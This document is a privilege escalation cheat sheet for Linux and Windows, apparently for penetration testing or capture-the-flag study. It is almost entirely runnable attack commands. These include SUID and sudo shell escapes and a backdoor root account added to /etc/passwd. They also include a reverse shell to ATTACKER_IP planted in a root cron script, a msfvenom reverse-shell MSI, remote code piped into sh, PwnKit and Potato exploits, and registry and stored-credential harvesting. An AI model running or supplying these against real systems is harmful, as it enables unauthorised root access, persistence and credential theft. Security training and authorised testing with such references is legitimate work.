# Privilege Escalation Cheatsheet

## Linux — Initial Checks

```bash
whoami && id
sudo -l
cat /etc/passwd | grep -v nologin
cat /etc/crontab; ls /etc/cron.*
uname -a; cat /etc/os-release    # kernel version
ps aux | grep root
env; export
cat ~/.bash_history
find / -perm -4000 2>/dev/null   # SUID
find / -perm -2000 2>/dev/null   # SGID
find / -writable -type f 2>/dev/null | grep -v proc
```

## Linux — Automated Tools

```bash
# linPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
./LinEnum.sh -s -k keyword -r report -e /tmp/

# LSE (Linux Smart Enumeration)
./lse.sh -l2
```

## Linux — SUID Exploitation (GTFOBins)

```bash
# Check: find / -perm -4000 2>/dev/null

# bash
bash -p

# find
find . -exec /bin/sh -p \; -quit

# vim
vim -c ':!/bin/sh'

# python
python -c 'import os; os.setuid(0); os.system("/bin/bash")'

# nmap (old versions)
nmap --interactive
!sh

# cp — overwrite /etc/passwd
cp /etc/passwd /tmp/passwd.bak
echo 'hacker::0:0::/root:/bin/bash' >> /etc/passwd
su hacker
```

## Linux — Sudo Misconfigurations

```bash
sudo -l

# sudo vim → escape to shell
sudo vim -c ':!/bin/bash'

# sudo find
sudo find /etc/passwd -exec /bin/sh \;

# sudo python
sudo python3 -c 'import os; os.system("/bin/bash")'

# sudo less / more / man
sudo less /etc/passwd
!/bin/sh

# sudo LD_PRELOAD
# if env_keep += LD_PRELOAD in sudoers:
# compile: gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
# sudo LD_PRELOAD=/tmp/preload.so <allowed command>
```

## Linux — Writable Cron Jobs

```bash
ls -la /etc/cron.*
cat /etc/crontab
crontab -l

# If a script run by root is world-writable:
echo 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' >> /path/to/script.sh
```

## Linux — Kernel Exploits

```bash
uname -a
# Search: https://www.exploit-db.com/
# Common: DirtyCow (CVE-2016-5195), PwnKit (CVE-2021-4034)

# PwnKit (pkexec SUID)
git clone https://github.com/ly4k/PwnKit
cd PwnKit && make && ./PwnKit
```

---

## Windows — Initial Checks

```cmd
whoami /priv
net user
net localgroup administrators
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
wmic qfe list brief | findstr "KB"   # patch level
```

## Windows — Automated Tools

```powershell
# winPEAS
.\winPEASx64.exe

# PowerUp
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt
.\Seatbelt.exe -group=all
```

## Windows — Service Misconfigurations

```cmd
# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"

# Weak service binary permissions
icacls "C:\path\to\service.exe"
# If writable: replace with malicious binary

# Check service config permissions (Accesschk)
accesschk64.exe -uwcqv "Everyone" *
accesschk64.exe -uwcqv "Users" *
```

## Windows — AlwaysInstallElevated

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If both = 1:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi -o evil.msi
msiexec /quiet /qn /i C:\Temp\evil.msi
```

## Windows — Token Impersonation

```cmd
# Check for SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege
whoami /priv

# JuicyPotato / PrintSpoofer / RoguePotato
.\PrintSpoofer64.exe -i -c cmd
.\JuicyPotatoNG.exe -t * -p "C:\Temp\shell.exe"
```

## Windows — Stored Credentials

```cmd
cmdkey /list
runas /savecred /user:Administrator cmd.exe

# Registry passwords
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Unattend.xml
dir /s unattend.xml
dir /s sysprep.xml
```
